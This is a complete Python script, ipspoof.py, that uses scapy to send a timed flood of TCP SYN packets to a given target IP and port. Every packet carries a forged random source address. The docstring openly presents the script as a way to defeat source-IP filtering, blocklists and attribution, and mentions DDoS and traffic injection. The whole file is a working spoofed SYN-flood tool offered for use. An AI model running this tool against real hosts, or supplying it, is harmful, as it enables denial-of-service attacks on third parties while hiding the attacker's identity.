#!/usr/bin/env python3
"""
IP Spoofing — Sends TCP SYN packets toward a target with RANDOMIZED
source IPs. The packets look like they come from many different hosts
on the network (and many that don't exist at all), defeating any
source-IP filtering, blocklisting, or attribution. Classic technique
used in DDoS amplification and in MITM-family attacks where the
attacker wants to inject traffic without revealing its real address.

Usage: python ipspoof.py <target_ip> <port> <duration_secs> [subnet_prefix]
Default subnet_prefix = 192.168.1
"""
import sys, time, random
from scapy.all import IP, TCP, conf

target   = sys.argv[1]
port     = int(sys.argv[2])
duration = int(sys.argv[3])
subnet   = sys.argv[4] if len(sys.argv) > 4 else "192.168.1"

print(f"[ipspoof] ★ SPOOFING SOURCE IPS", flush=True)
print(f"[ipspoof]   target      = {target}:{port}", flush=True)
print(f"[ipspoof]   spoof range = {subnet}.150–250  (hosts that don't exist)", flush=True)
print(f"[ipspoof]   duration    = {duration}s", flush=True)
print(f"[ipspoof] every packet will have a forged source IP — "
      f"attribution and blocklists are useless", flush=True)

sock = conf.L3socket()
end  = time.time() + duration
n    = 0
seen_sources = set()
start = time.time()

while time.time() < end:
    fake_src   = f"{subnet}.{random.randint(150, 250)}"
    fake_sport = random.randint(1024, 65535)
    seen_sources.add(fake_src)
    pkt = IP(src=fake_src, dst=target) / TCP(
        sport=fake_sport, dport=port,
        flags="S", seq=random.randint(0, 4294967295),
        window=64240
    )
    sock.send(pkt)
    n += 1
    if n % 500 == 0:
        elapsed = time.time() - start
        print(f"  sent {n} packets ({n/elapsed:.0f}/s)  "
              f"unique spoofed sources={len(seen_sources)}", flush=True)

elapsed = time.time() - start
print(f"[ipspoof] FINISHED — {n} packets sent in {elapsed:.1f}s "
      f"({n/elapsed:.0f} pps)  spoofed from {len(seen_sources)} "
      f"unique fake source IPs", flush=True)
